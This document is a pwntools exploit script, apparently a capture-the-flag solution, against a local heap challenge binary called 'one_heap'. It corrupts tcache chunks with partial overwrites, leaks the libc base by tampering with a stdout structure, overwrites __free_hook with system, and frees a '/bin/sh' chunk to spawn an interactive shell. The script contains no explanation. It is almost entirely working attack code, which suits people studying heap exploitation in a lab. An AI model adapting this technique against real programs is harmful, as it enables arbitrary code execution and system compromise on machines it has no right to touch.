from pwn import *
def cmd(c):
	p.sendlineafter(":",str(c))
def add(size,name=""):
	cmd(1)
	p.sendlineafter("size:",str(size))
	p.sendlineafter(":",name)
def free():
	cmd(2)
context.log_level='debug'
p=process('./one_heap')
libc=ELF("./one_heap").libc
cmd(1)
p.sendlineafter("size:",str(0x79))
p.sendafter(":",'\x00'*0x78+'\x91')

free()
free()
add(0x79,p16(0x7010))#1
add(0x7f)#2
add(0x7f,'\x00'*0x20+p64(0x0000000007000000))#3
free()
add(0x41,'\x00'*0x40)#4
add(0x18)
add(0x18,'\x60\x07\xdd')#5
add(0x78,p64(0x1800)+'\x00'*0x18+'\x00')#6
p.read(0x20)
base=u64(p.read(8))-(0x7ffff7dcf780-0x7ffff79e4000)
log.warning(hex(base))
add(0x38,'\x10\x70')
add(0x48,"")
add(0x7f,"")
libc.address=base
add(0x7f,p64(libc.sym['__free_hook']))
add(0x48)
add(0x48,p64(libc.sym['system']))
add(0x18,"/bin/sh\x00")
gdb.attach(p,'')

p.interactive()
# 03:36:15
# 19-06-27
```
